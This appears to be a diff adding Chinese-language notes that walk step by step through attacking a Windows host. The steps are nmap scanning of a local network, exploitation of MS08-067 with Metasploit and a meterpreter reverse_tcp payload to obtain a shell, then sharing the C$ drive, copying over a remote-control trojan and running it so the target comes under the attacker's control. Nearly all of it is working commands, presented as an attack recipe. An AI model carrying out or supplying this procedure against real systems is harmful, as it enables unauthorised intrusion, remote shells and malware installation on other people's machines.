@@ -1,0 +1,59 @@
+
+1.nmap -sP  192.168.1.* |grep for 查看存活主机
+
+2.选择目标主机 192.168.1.13
+
+3.扫描常见的服务  nmap 192.168.1.13
+
+4.扫描目标的操作系统类型 nmap -O 192.168.1.13 
+
+5.查看各个服务的版本信息 nmap -sV 192.168.1.13
+
+
+6.扫描目标服务可能存在的漏洞 
+nmap  -script=smb-check-vulns.nse
+
+7.利用可能存在的漏洞(例如MS08_067)溢出
+nmap -sS -sV -O -script=smb-check-vulns.nse 192.168.1.13
+
+8.进入MSF目录
+cd /pentest/expliots/framework2c	/
+
+9.启动MSF
+./msfconsole
+
+10.查看漏洞script脚本 search MS08_067
+
+11.选择script脚本  use exploit/windows/smb/MS08067_netapi
+	
+12 设置payload方式 set payload windows/meterpreter/reverse_tcp
+
+13.查看选项 show options
+
+14.溢出设置 
+
+set RHOST 目标ip
+
+set LHOST 自己ip   还可以 show targets 查看可攻击的目标
+
+15. 溢出攻击目标 exploit
+
+16. 查看会话 sessions -l
+ 
+17. 连接会话 session -i 1
+ 
+18. sysinfo 查看系统信息  shell 进入cmdshell
+
+19. MS溢出得到cmdshell   
+
+20. 配置远控  之后溢出cmdshell里执行
+
+21. net share C$    把C盘共享出来
+
+22. 自己cmd下   \\192.168.1.13\c$ 打开共享  复制自己的小马过去
+
+22. 溢出cmdshell里面进入C盘 cd c:\
+
+23. 运行muma.exe远控小马   目标上线。
+
+24. 记住也可以用msfweb方式进行设置  http://127.0.0.1:5555/
